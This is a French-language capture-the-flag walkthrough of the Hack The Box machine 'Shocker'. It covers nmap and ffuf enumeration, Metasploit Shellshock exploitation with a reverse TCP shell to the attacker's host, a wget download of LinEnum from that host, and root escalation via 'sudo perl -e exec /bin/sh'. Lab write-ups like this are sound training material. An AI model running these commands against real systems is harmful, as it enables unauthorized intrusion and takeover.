# Shocker [Linux] Easy

[https://app.hackthebox.com/machines/Shocker](https://app.hackthebox.com/machines/Shocker)

# **— 1. Enumeration —**

## Nmap

`nmap -sT -sV 10.10.10.56`

```python
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org/) ) at 2022-04-07 16:48 EDT
Nmap scan report for 10.10.10.56
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                          Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
```

## Ffuf

Avec ffuf on trouve un dossier étrange qui est en rapport avec la faille shellshock à cause du dossier /cgi-bin/ avec un script dedans :

[https://www.yeahhub.com/shellshock-vulnerability-exploitation-metasploit-framework/](https://www.yeahhub.com/shellshock-vulnerability-exploitation-metasploit-framework/)

Nous allons donc utiliser Metasploit.

# — 2.Exploit —

Comme dans l’article link dans le numéro 1 nous pouvons utiliser l’exploit  :

use ***exploit/multi/http/apache_mod_cgi_bash_env_exec***

Metasploit :

---

```bash
msf6 > search shellshock

0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
3   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
6   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)

Le 1 This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets CGI scripts in the Apache web server by setting the HTTP_USER_AGENT environment variable to a malicious function definition.

- Exploitation avec Metasploit-

use multi/http/apache_mod_cgi_bash_env_exec

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.10.10.56
RHOSTS => 10.10.10.56
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/user.sh
TARGETURI => /cgi-bin/user.sh
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 10.10.14.16
LHOST => 10.10.14.16
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > check
[+] 10.10.10.56:80 - The target is vulnerable.

meterpreter > exploit -j
```

# **— 3. PrivEsc Avec LinEnum—**

Créé un Serveur Python avec : `python -m http.server 8080`

[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

Sur la machine ou nous avons le shell : wget [http://notre](http://notre/) ip:8080/linEnum.sh

On à en retour du script que nous avons une permission sudo sur perl

Sinon taper `sudo -l` et avoir cette même info.

[https://gtfobins.github.io/gtfobins/perl/](https://gtfobins.github.io/gtfobins/perl/)

`sudo perl -e 'exec "/bin/sh";'`

On est root nous avons accès au flag !